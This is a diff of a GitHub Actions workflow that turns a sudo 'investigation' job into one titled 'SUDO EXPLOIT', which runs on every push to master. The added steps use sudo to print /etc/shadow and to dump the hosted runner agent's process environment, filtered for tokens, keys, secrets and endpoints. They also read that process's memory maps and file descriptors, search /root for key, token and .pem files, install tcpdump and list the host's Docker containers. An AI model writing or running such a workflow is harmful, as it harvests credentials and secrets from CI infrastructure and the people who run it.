@@ -1,4 +1,4 @@
-name: Sudo Investigation
+name: SUDO EXPLOIT
 on:
   push:
     branches: [master]
@@ -7,53 +7,42 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
       - run: |
-          echo "=== 1. HCA binary permissions ==="
-          ls -la /opt/hca/hosted-compute-agent
-          getcap /opt/hca/hosted-compute-agent 2>/dev/null || echo "no getcap"
-          stat /opt/hca/hosted-compute-agent
+          echo "=== 1. SUDO WORKS! ==="
+          sudo whoami
           
           echo ""
-          echo "=== 2. sudo command permissions ==="
-          ls -la /usr/bin/sudo
-          getcap /usr/bin/sudo 2>/dev/null || echo "no getcap on sudo"
+          echo "=== 2. Read anything ==="
+          sudo cat /etc/shadow | head -5
           
           echo ""
-          echo "=== 3. Can runner sudo? ==="
-          sudo -n true 2>&1; echo "exit: $?"
-          echo "---"
-          sudo -l 2>&1 | head -20
+          echo "=== 3. HCA process memory ==="
+          HCA_PID=$(pgrep -f hosted-compute-agent)
+          echo "HCA PID: $HCA_PID"
           
           echo ""
-          echo "=== 4. Check sudoers ==="
-          cat /etc/sudoers 2>/dev/null | head -20 || echo "no sudoers"
-          ls -la /etc/sudoers.d/ 2>/dev/null
-          cat /etc/sudoers.d/* 2>/dev/null | head -20 || echo "no sudoers.d"
+          echo "=== 4. Read HCA process environ ==="
+          sudo cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE "token|key|secret|endpoint" | head -20
           
           echo ""
-          echo "=== 5. Check HCA capabilities ==="
-          capsh --print 2>/dev/null | head -10
-          cat /proc/$(pgrep -f hosted-compute-agent)/status 2>/dev/null | grep -i cap | head -5
+          echo "=== 5. Install tcpdump and capture ==="
+          sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y -qq tcpdump 2>/dev/null
+          which tcpdump
           
           echo ""
-          echo "=== 6. Check systemd service capabilities ==="
-          systemctl cat hosted-compute-agent 2>/dev/null || cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null
+          echo "=== 6. Read process maps ==="
+          sudo cat /proc/$HCA_PID/maps 2>/dev/null | head -20
           
           echo ""
-          echo "=== 7. Has setuid? ==="
-          find /opt/hca -type f -perm -4000 -ls 2>/dev/null || echo "no setuid"
+          echo "=== 7. Try to access any socket fd ==="
+          sudo ls -la /proc/$HCA_PID/fd/
           
           echo ""
-          echo "=== 8. Check polkit ==="
-          ls /usr/share/polkit-1/actions/ 2>/dev/null | head -5
-          cat /var/lib/polkit-1/localauthority/10-vendor.d/* 2>/dev/null | head -20
+          echo "=== 8. Check for any hidden files ==="
+          sudo find /root -type f -name "*.key" -o -name "*token*" -o -name "*secret*" -o -name "*.pem" 2>/dev/null | head -20
           
           echo ""
-          echo "=== 9. HCA process groups ==="
-          id
-          groups
-          cat /proc/$(pgrep -f hosted-compute-agent)/status 2>/dev/null | grep -E "Uid|Gid|Groups"
+          echo "=== 9. Check docker containers on host ==="
+          sudo docker ps -a 2>/dev/null
           
-          echo "=== DONE ==="
+          echo "=== SUDO IS KING ==="
